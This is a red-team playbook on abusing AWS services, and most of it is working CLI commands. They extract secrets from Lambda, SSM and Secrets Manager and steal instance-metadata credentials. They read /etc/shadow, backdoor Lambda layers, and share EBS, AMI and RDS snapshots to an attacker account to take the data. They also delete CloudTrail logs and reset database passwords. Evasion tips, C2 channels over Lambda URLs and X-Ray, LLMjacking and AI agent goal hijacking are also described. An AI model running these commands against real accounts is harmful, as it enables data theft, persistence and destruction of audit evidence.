# AWS Services Abuse
> **MITRE ATT&CK**: Multiple Techniques (Collection, Lateral Movement, Credential Access)
> **Platforms**: AWS
> **Required Privileges**: Low to Medium (service-dependent)
> **OPSEC Risk**: Low-Medium

## Strategic Overview

AWS operates 200+ services, each with its own API, permissions model, and attack surface.
Red team operators must think of each service as both a target (containing data, secrets,
compute) and a weapon (abusable for lateral movement, persistence, exfiltration). The
most impactful services for offensive operations are S3, Lambda, EC2, SSM, Secrets
Manager, and container services. Mastering their abuse separates competent cloud operators
from script runners.

## Technical Deep-Dive

### S3 -- Simple Storage Service

```bash
# Bucket enumeration (unauthenticated)
aws s3 ls s3://target-corp-backup --no-sign-request
aws s3 ls s3://target-corp-backup --no-sign-request --recursive | head -50

# Download sensitive files
aws s3 cp s3://target-corp-backup/db-dump.sql.gz . --no-sign-request

# Check bucket policy for overly permissive access
aws s3api get-bucket-policy --bucket target-corp-backup | jq .

# Generate presigned URL for sharing (if you have s3:GetObject)
aws s3 presign s3://internal-bucket/sensitive-doc.pdf --expires-in 604800

# Cross-account access via bucket policy misconfiguration
# If policy allows Principal: "*" or a broad account
aws s3api get-object --bucket target-bucket --key secrets.txt /tmp/out --profile attacker

# ACL enumeration
aws s3api get-bucket-acl --bucket target-bucket
aws s3api get-object-acl --bucket target-bucket --key config.yml

# Bucket policy abuse: Write access to a bucket used by CloudTrail
# Inject fake log entries or delete evidence
aws s3 rm s3://cloudtrail-logs/AWSLogs/ACCT/CloudTrail/us-east-1/2024/ --recursive
```

### Lambda -- Serverless Compute

```bash
# List all functions and their configurations
aws lambda list-functions --query 'Functions[].{Name:FunctionName,Role:Role,Runtime:Runtime}'

# Extract environment variables (common secret storage)
aws lambda get-function-configuration --function-name prod-api \
  --query 'Environment.Variables'
# Commonly leaks: DATABASE_URL, API_KEY, JWT_SECRET, AWS credentials

# Download function code
aws lambda get-function --function-name prod-api --query 'Code.Location' -o text | xargs curl -o function.zip

# Invoke a function directly
aws lambda invoke --function-name prod-api --payload '{"cmd":"id"}' /dev/stdout

# Layer poisoning - inject malicious code via Lambda layers
aws lambda publish-layer-version --layer-name shared-utils \
  --zip-file fileb://backdoored-layer.zip --compatible-runtimes python3.9
aws lambda update-function-configuration --function-name prod-api \
  --layers arn:aws:lambda:us-east-1:ACCT:layer:shared-utils:2

# VPC-attached Lambda = access to internal resources
aws lambda get-function-configuration --function-name prod-api \
  --query 'VpcConfig.{Subnets:SubnetIds,SGs:SecurityGroupIds}'
```

#### Lambda Function URL Enumeration

Lambda Function URLs provide direct HTTPS endpoints without API Gateway. During engagements,
listing all Function URLs across regions is essential for identifying exposed attack surface:

```bash
# Enumerate Lambda Function URLs across all regions for an account
# Many Lambda functions expose Function URLs that may lack proper authentication
for region in $(aws ec2 describe-regions --query 'Regions[].RegionName' --output text); do
  echo "=== $region ==="
  for func in $(aws lambda list-functions --region $region --query 'Functions[].FunctionName' --output text 2>/dev/null); do
    url=$(aws lambda get-function-url-config --function-name $func --region $region --query 'FunctionUrl' --output text 2>/dev/null)
    if [ "$url" != "None" ] && [ -n "$url" ]; then
      auth=$(aws lambda get-function-url-config --function-name $func --region $region --query 'AuthType' --output text 2>/dev/null)
      echo "  Function: $func | URL: $url | Auth: $auth"
    fi
  done
done

# Key findings to look for:
# - AuthType: NONE = unauthenticated access (low-hanging fruit)
# - AuthType: AWS_IAM = requires IAM authentication (test with stolen creds)
# - Check CORS configuration for overly permissive origins
```

#### Lambda Code Download and Analysis

Downloading Lambda function source code reveals hardcoded credentials, supported HTTP methods,
internal API endpoints, and business logic vulnerabilities:

```bash
# Download Lambda function code for analysis
aws lambda get-function --function-name target-function \
  --query 'Code.Location' --output text | xargs curl -o function.zip
unzip function.zip -d function_code/

# Automated analysis of downloaded code
# Search for hardcoded secrets
grep -rn "password\|secret\|api_key\|token\|AWS_ACCESS\|AKIA" function_code/
grep -rn "BEGIN.*PRIVATE KEY\|jdbc:\|mongodb://\|redis://" function_code/

# Identify supported HTTP methods and parameters
grep -rn "httpMethod\|queryStringParameters\|body\|headers" function_code/

# Look for internal service endpoints
grep -rn "http://\|https://\|amazonaws.com\|internal" function_code/
```

> **References**:
> - watson0x90. Listing AWS Lambda URLs. https://watson0x90.com/listing-aws-lambda-urls-ed12d4d1b3ef
> - watson0x90. Download AWS Lambda Code. https://watson0x90.com/download-aws-lambda-code-4cae7492eba6

### EC2 -- Elastic Compute Cloud

```bash
# Instance metadata from compromised instance
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/user-data  # Often contains bootstrap secrets

# EBS snapshot access (data theft across accounts)
aws ec2 describe-snapshots --owner-ids ACCT --query 'Snapshots[].SnapshotId'
# Share snapshot with attacker account
aws ec2 modify-snapshot-attribute --snapshot-id snap-abc123 \
  --attribute createVolumePermission --operation-type add --user-ids ATTACKER_ACCT
# In attacker account: create volume, attach, mount, read data

# AMI sharing for persistence
aws ec2 modify-image-attribute --image-id ami-abc123 \
  --launch-permission "Add=[{UserId=ATTACKER_ACCT}]"

# User data script extraction (may contain passwords/keys)
aws ec2 describe-instance-attribute --instance-id i-abc123 --attribute userData \
  --query 'UserData.Value' -o text | base64 -d
```

### SSM -- Systems Manager

```bash
# Session Manager - interactive shell without SSH/RDP
aws ssm start-session --target i-0abc123def456
# No inbound security group rules needed; uses HTTPS outbound

# Run Command - execute on multiple instances simultaneously
aws ssm send-command --instance-ids i-0abc123 i-0def456 \
  --document-name "AWS-RunShellScript" \
  --parameters 'commands=["whoami","cat /etc/shadow","curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"]'

# Parameter Store - secret extraction
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption \
  --query 'Parameters[].{Name:Name,Value:Value}'
# Commonly stores: database passwords, API keys, certificates

# Get specific secret
aws ssm get-parameter --name /prod/database/password --with-decryption
```

### Secrets Manager & Parameter Store

```bash
# List all secrets
aws secretsmanager list-secrets --query 'SecretList[].{Name:Name,ARN:ARN}'

# Retrieve secret values
aws secretsmanager get-secret-value --secret-id prod/database/master \
  --query 'SecretString' -o text | jq .

# Enumerate all Parameter Store values
aws ssm describe-parameters --query 'Parameters[].Name'
aws ssm get-parameters --names /app/prod/db_password --with-decryption
```

### RDS -- Relational Database Service

```bash
# List databases and check public accessibility
aws rds describe-db-instances \
  --query 'DBInstances[].{ID:DBInstanceIdentifier,Engine:Engine,Public:PubliclyAccessible,Endpoint:Endpoint.Address}'

# Snapshot sharing (exfiltrate entire databases)
aws rds create-db-snapshot --db-instance-identifier prod-db --db-snapshot-identifier exfil-snap
aws rds modify-db-snapshot-attribute --db-snapshot-identifier exfil-snap \
  --attribute-name restore --values-to-add ATTACKER_ACCT
# Attacker restores snapshot in their account and reads all data

# Modify master credentials (destructive but effective)
aws rds modify-db-instance --db-instance-identifier prod-db \
  --master-user-password 'NewP@ssw0rd!'
```

### ECS/EKS -- Container Services

```bash
# ECS task role abuse
aws ecs list-tasks --cluster prod-cluster
aws ecs describe-tasks --cluster prod-cluster --tasks TASK_ARN \
  --query 'tasks[].{Role:taskRoleArn,Containers:containers[].name}'

# EKS - Kubernetes API access
aws eks update-kubeconfig --name prod-cluster --region us-east-1
kubectl get secrets --all-namespaces
kubectl get pods --all-namespaces
kubectl exec -it POD_NAME -- /bin/bash

# Container escape to node (if privileged)
# From inside container, access node metadata
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### STS -- Security Token Service

```bash
# Generate session token for MFA-protected operations
aws sts get-session-token --serial-number arn:aws:iam::ACCT:mfa/user --token-code 123456

# Federation token (create temporary credentials with subset of permissions)
aws sts get-federation-token --name temp-user \
  --policy '{"Statement":[{"Effect":"Allow","Action":"s3:*","Resource":"*"}]}'

# Role chaining for lateral movement
aws sts assume-role --role-arn arn:aws:iam::ACCT2:role/ServiceRole \
  --role-session-name chain1
# Each assumed role can assume another, up to a chain depth limit
```

## Detection & Evasion

| Service Action              | CloudTrail Event          | OPSEC Note                          |
|-----------------------------|---------------------------|-------------------------------------|
| S3 GetObject                | Data event (if enabled)   | Data events often disabled          |
| Lambda Invoke               | Management event          | High-volume functions may mask      |
| SSM SendCommand             | Management event          | Name commands as maintenance tasks  |
| SecretsManager GetSecret    | Management event          | Always logged; time your access     |
| STS AssumeRole              | Management event          | Use descriptive session names       |

## 2025 Techniques

### Serverless Attack Techniques -- Function Confusion & Lambda Abuse

```
# Function Confusion (Datadog / Aqua / Sysdig, 2025)
# MITRE: T1190 / T1059.009

# Cross-platform serverless attack pattern:
# Exploits trust relationship between cloud functions and event sources
# Affects AWS Lambda, GCP Cloud Functions, Azure Functions

# 100x growth in stolen cloud tokens from serverless functions (2025 vs 2024)
# Serverless functions are now the #1 source of leaked temporary credentials

# Lambda Layer Persistence:
# Attacker publishes malicious Lambda layer with backdoor code
# Layer intercepts function invocations and exfiltrates credentials
# Layers execute BEFORE function code, enabling transparent interception
# Compatible across runtimes: Python, Node.js, Java, .NET

# Lambda Bootstrap Persistence:
# Custom runtime bootstrap file (bootstrap) replaced with backdoor
# Executes as the Lambda runtime entry point
# Persists across function code updates (only layer update removes it)

# Lambda Function URL as C2:
# Lambda Function URLs provide HTTPS endpoints without API Gateway
# Attacker deploys Lambda with Function URL as C2 callback
# Traffic appears as legitimate AWS HTTPS traffic
# No API Gateway logs -- only Lambda invocation logs
# Low cost, high availability, auto-scaling C2 infrastructure
```

### Container Escape Vulnerabilities (2025)

```
# runc Triple CVE (February 2025)
# CVE-2025-31133 / CVE-2025-52565 / CVE-2025-52881
# MITRE: T1611 / T1068

# Three related vulnerabilities in runc container runtime
# Affects Docker, Kubernetes (EKS, ECS), and all OCI-compliant runtimes

# CVE-2025-31133: File descriptor leak during container creation
#   Allows process inside container to access host filesystem
# CVE-2025-52565: Race condition in mount namespace setup
#   Enables container-to-host filesystem escape
# CVE-2025-52881: Symlink-exchange attack during volume mount
#   Attacker replaces volume path with symlink to host root

# Impact on AWS:
# EKS worker nodes running unpatched runc are vulnerable
# ECS tasks with host networking or privileged mode at highest risk
# Fargate containers are NOT affected (AWS manages runtime)

# NVIDIAScape -- CVE-2025-23266 (CVSS 9.0)
# MITRE: T1611

# Container escape via NVIDIA GPU driver vulnerability
# Affects any container with GPU access (ML/AI workloads)
# Exploits NVIDIA Container Toolkit to escape to host

# AWS Impact:
# EC2 GPU instances (p4d, p5, g5) running containers
# SageMaker training jobs with GPU access
# EKS pods with nvidia.com/gpu resource requests
# Escape grants full host access including IMDS credentials
```

### LLMjacking -- AI Service Abuse

```
# Sysdig / Permiso / Lacework (2025)
# MITRE: T1496 / T1078.004

# LLMjacking: Unauthorized use of compromised cloud credentials
# to consume expensive AI/LLM services

# Cost impact: $46,000 to $100,000+ per DAY in compute charges
# Attackers use stolen credentials to invoke foundation models

# Amazon Bedrock Abuse:
# Stolen IAM credentials with bedrock:InvokeModel permission
# Attackers spin up inference against Claude, Titan, Llama models
# Used for: generating phishing content, code generation, resale
# Bedrock API calls appear in CloudTrail but volume is key indicator

# Cross-Region Inference Evasion:
# Attackers invoke models in regions where victim has Bedrock enabled
# but does NOT monitor CloudTrail (non-primary regions)
# Bedrock cross-region inference routes requests to available capacity
# Attacker calls us-east-1 but inference runs in us-west-2
# CloudTrail logs appear in the INFERENCE region, not the API region

# Detection indicators:
# - Sudden spike in Bedrock InvokeModel / InvokeModelWithResponseStream
# - API calls from unusual source IPs or user agents
# - High token counts per request (maximizing value per call)
# - Requests across multiple model IDs in rapid succession
```

### XRayC2 -- AWS X-Ray as Command-and-Control Channel

```
# Security research (2025)
# MITRE: T1071.001 / T1132

# Abuses AWS X-Ray tracing service as a covert C2 channel
# X-Ray is a legitimate AWS observability service
# Traffic blends with normal application telemetry

# How it works:
# 1. Implant on compromised Lambda/EC2 sends X-Ray trace segments
# 2. C2 commands encoded in trace annotations and metadata fields
# 3. Operator retrieves commands via GetTraceSummaries / BatchGetTraces
# 4. Responses sent back as new trace segments with encoded data

# Advantages:
# - Uses legitimate AWS SDK calls (xray:PutTraceSegments)
# - Traffic is TLS-encrypted to AWS endpoints
# - X-Ray data retention is 30 days by default
# - No additional infrastructure needed
# - Blends with legitimate application tracing

# Detection:
# - Unusual X-Ray segment volume from non-instrumented services
# - Trace annotations with high-entropy or encoded data
# - X-Ray API calls from IAM principals not associated with DevOps
```

### CloudConqueror -- AWS CloudControl API Attack Surface

```
# Security research (2025)
# MITRE: T1106 / T1578

# AWS Cloud Control API provides uniform CRUD interface
# for 1,200+ AWS resource types via a single API endpoint

# Attack surface implications:
# cloudcontrol:CreateResource can provision ANY supported resource type
# Single permission grants access to create resources across services
# Bypasses service-specific IAM deny policies in some configurations

# Offensive use cases:
# 1. Resource creation: Spin up EC2, Lambda, S3 via Cloud Control
#    even when service-specific APIs (ec2:RunInstances) are denied
# 2. Resource enumeration: cloudcontrol:ListResources across all types
#    provides comprehensive inventory without service-specific permissions
# 3. Configuration modification: cloudcontrol:UpdateResource to modify
#    security groups, bucket policies, IAM roles through single API

# Example:
# aws cloudcontrol create-resource \
#   --type-name AWS::EC2::Instance \
#   --desired-state '{"InstanceType":"t3.micro","ImageId":"ami-xxx"}'

# Defense gap:
# Many SCPs and IAM policies do not account for Cloud Control API
# Organizations deny ec2:RunInstances but allow cloudcontrol:*
# CloudTrail logs show cloudcontrol.amazonaws.com as event source
# NOT the underlying service, complicating detection
```

### HazyBeacon: C2 via AWS Lambda Function URLs

```
# Unit42 (Palo Alto Networks) (2025)
# MITRE: T1071.001 / T1102.002

# Real-world Windows backdoor (HazyBeacon) establishing C2 communication
# via AWS Lambda Function URLs
# Uses legitimate AWS infrastructure for command and control
# Traffic appears as standard HTTPS communication with AWS endpoints

# Demonstrates that serverless function URLs are being weaponized
# for covert communications in active campaigns
# Lambda Function URLs provide direct HTTPS endpoints without API Gateway
# Detection requires correlating Lambda invocation patterns with endpoint behavior
```

### Mass AI Deployment Scanning Campaign

```
# eSecurity Planet / CybersecurityNews (2025-2026)
# MITRE: T1595 / T1190

# 80,469 attack sessions over 11 days methodically probing
# more than 70 LLM endpoints (October 2025 - January 2026)

# Objective: identify misconfigured proxy servers allowing
# unauthorized access to commercial AI services

# Targeted Ollama deployments and proxy infrastructure
# connecting apps to LLM APIs

# Shows systematic reconnaissance of AI infrastructure at scale
# Attackers scanning for exposed AI model endpoints
# to gain free access or abuse commercial AI services
```

### AI Agent Goal Hijacking

```
# Multiple researchers (2025-2026)

# Unlike simple prompt injection, agent goal hijacking
# redirects an AI agent's core mission through manipulation
# Targets persistent objectives rather than individual responses

# When OpenAI released GPT-5 in January 2026,
# red teams jailbroke it within 24 hours

# Emerging threat class for autonomous AI systems
# deployed in cloud environments for automation
# Particularly relevant for AI agents with cloud API access
# where hijacked goals could lead to unauthorized resource manipulation
```

## Cross-References

- [AWS Initial Access](aws-initial-access.md)
- [AWS IAM Privilege Escalation](aws-iam-escalation.md)
- [AWS Persistence](aws-persistence.md)
- [Cloud Tools Reference](../cloud-tools.md)

## References

- https://hackingthe.cloud/aws/exploitation/
- https://github.com/RhinoSecurityLabs/pacu
- https://github.com/BishopFox/cloudfox
- https://docs.aws.amazon.com/service-authorization/latest/reference/
- LLMjacking: https://sysdig.com/blog/llmjacking/
- XRayC2: https://hackingthe.cloud/aws/post_exploitation/xray-c2/
- CloudConqueror: https://hackingthe.cloud/aws/exploitation/cloud-control-api/
- runc CVEs: https://github.com/opencontainers/runc/security/advisories
- NVIDIAScape: https://nvidia.custhelp.com/app/answers/detail/a_id/5582
- watson0x90. Listing AWS Lambda URLs: https://watson0x90.com/listing-aws-lambda-urls-ed12d4d1b3ef
- watson0x90. Download AWS Lambda Code: https://watson0x90.com/download-aws-lambda-code-4cae7492eba6
